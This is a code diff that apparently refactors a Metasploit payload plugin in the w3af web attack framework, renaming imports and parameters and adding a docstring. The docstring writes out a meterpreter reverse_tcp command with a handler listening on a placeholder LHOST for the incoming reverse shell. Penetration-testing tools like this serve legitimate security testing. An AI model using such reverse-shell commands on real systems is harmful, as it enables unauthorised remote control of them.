@@ -1,23 +1,32 @@
-from plugins.attack.payloads.base_payload import base_payload
-import core.controllers.outputManager as om
-from core.controllers.vdaemon.vdFactory import getVirtualDaemon
-from core.controllers.w3afException import w3afException
+from plugins.attack.payloads.base_payload import Payload
+from core.controllers.vdaemon.vdFactory import get_virtual_daemon
+from core.controllers.exceptions import w3afException
 
 
-class metasploit(base_payload):
+class metasploit(Payload):
     '''
     This payload interacts with the metasploit framework.
+
+    Usage:
+    You need to specify the payload type in MSF format as if you were calling msfpayload:
+        linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4
+
+    And then add a pipe ("|") to add the msfcli parameters for handling the
+    incoming connection (in the case of a reverse shell) or connect to the
+    remote server.
+
+    A complete example looks like this:
+        linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
     '''
-    def api_execute(self, parameters):
+    def api_execute(self, msf_args):
         try:
-            vd = getVirtualDaemon(self.shell.execute)
+            vd = get_virtual_daemon(self.shell.execute)
         except w3afException, w3:
             return 'Error, %s' % w3
         else:
-            vd.run( parameters )
+            vd.run(msf_args)
             return 'Successfully started the virtual daemon.'
-    
-    def run_execute(self, parameters):
-        api_result = self.api_execute(parameters)
-        return api_result
 
+    def run_execute(self, msf_args):
+        api_result = self.api_execute(msf_args)
+        return api_result
